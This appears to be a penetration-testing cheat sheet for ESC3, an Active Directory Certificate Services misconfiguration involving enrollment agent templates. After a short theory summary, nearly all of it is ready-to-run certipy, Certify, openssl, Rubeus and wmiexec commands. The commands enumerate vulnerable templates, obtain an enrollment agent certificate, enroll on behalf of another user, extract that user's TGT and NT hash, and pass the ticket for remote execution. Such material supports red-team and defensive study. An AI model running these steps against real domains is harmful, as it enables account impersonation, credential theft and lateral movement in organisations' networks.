# ESC3—Misconfigured Enrollment Agent Templates

## Theory


> [!summary] Overview
> Templates that issue **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`) to low-privileged users allow them to obtain an **enrollment agent** cert. That cert can then co-sign a CSR to enroll **on behalf of** another user in a second template that permits EoB (enroll-on-behalf-of) and has an authentication EKU (e.g., Client Authentication). Result: a valid cert for the target user, enabling PKINIT to get a TGT and NTLM.

Placeholders: `<FOREST_DN>` `<CA_FQDN>` `<CA_NAME>` `<EA_TEMPLATE>` `<AUTH_TEMPLATE>` `<DOMAIN>` `<ALT_SAM>`

## Linux

### Enumerate

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for templates with EKU: Certificate Request Agent and low-priv Enroll
# Also identify a second template (e.g., 'User') with Client Authentication EKU that allows EoB
```

### Step 1—Get Enrollment Agent Certificate (Condition 1)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<EA_TEMPLATE>' \
  -out '<EA_BASENAME>'            # writes <EA_BASENAME>.pfx
```

### Step 2—Enroll on behalf of Target (Condition 2)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<AUTH_TEMPLATE>' \
  -on-behalf-of '<DOMAIN>\<ALT_SAM>' -pfx '<EA_BASENAME>.pfx' \
  -out '<ALT_BASENAME>'           # writes <ALT_BASENAME>.pfx (target’s cert)
```

### Step 3—Authenticate as Target

```bash
certipy auth -pfx '<ALT_BASENAME>.pfx' -username '<ALT_SAM>' -domain '<DOMAIN>' -dc-ip <DC_IP>
# => produces <ALT_SAM>.ccache and may return NT hash
```

### Optional—Use TGT

```bash
KRB5CCNAME=<ALT_SAM>.ccache wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
```

Placeholders: `<DOMAIN>` `<USER>` `<PASS>` `<DC_IP>` `<CA_NAME>` `<EA_TEMPLATE>` `<AUTH_TEMPLATE>` `<ALT_SAM>` `<EA_BASENAME>` `<ALT_BASENAME>` `<TARGET_HOST_FQDN>`

---

## Windows

### Enumerate

```powershell
.\Certify.exe find /vulnerable
# Identify: (1) template with Certificate Request Agent EKU and low-priv Enroll
#           (2) template with Client Authentication EKU that supports EoB
```

Optional LDAP:

```powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)
  (|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)(mspki-certificate-application-policy=1.3.6.1.4.1.311.20.2.1)))' `
-SearchBase "CN=Configuration,<FOREST_DN>"
```

### Step 1—Get Enrollment Agent Certificate

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<EA_TEMPLATE> > ea.pem
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 `
  -in ea.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out ea.pfx
```

### Step 2—Enroll on behalf of Target

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<AUTH_TEMPLATE> `
  /onbehalfof:<DOMAIN>\<ALT_SAM> /enrollcert:ea.pfx > target.pem
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 `
  -in target.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out target.pfx
```

### Step 3—Authenticate as Target

```powershell
.\Rubeus.exe asktgt /user:<DOMAIN>\<ALT_SAM> /certificate:target.pfx /getcredentials /nowrap
# => Base64 TGT and possibly NTLM
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
```

